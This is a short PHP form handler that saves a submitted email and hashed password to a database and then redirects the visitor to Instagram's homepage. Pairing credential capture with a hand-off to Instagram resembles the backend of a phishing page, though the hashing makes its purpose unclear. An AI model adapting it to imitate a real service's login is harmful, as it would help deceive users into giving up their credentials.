<?php
session_start();
require "config.php";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email']);
    $password = trim($_POST['password']);

    // Store in database
    $stmt = $conn->prepare("INSERT INTO users (email, password, created_at) VALUES (:email, :password, NOW())");
    $stmt->execute([
        ':email' => $email,
        ':password' => password_hash($password, PASSWORD_DEFAULT) // hashing password
    ]);



    // Redirect to any page
    header("Location: https://www.instagram.com/"); // change to your page
    exit;
} else {
    // If accessed directly, redirect to form
    header("Location: index.php");
    exit;
}
?>
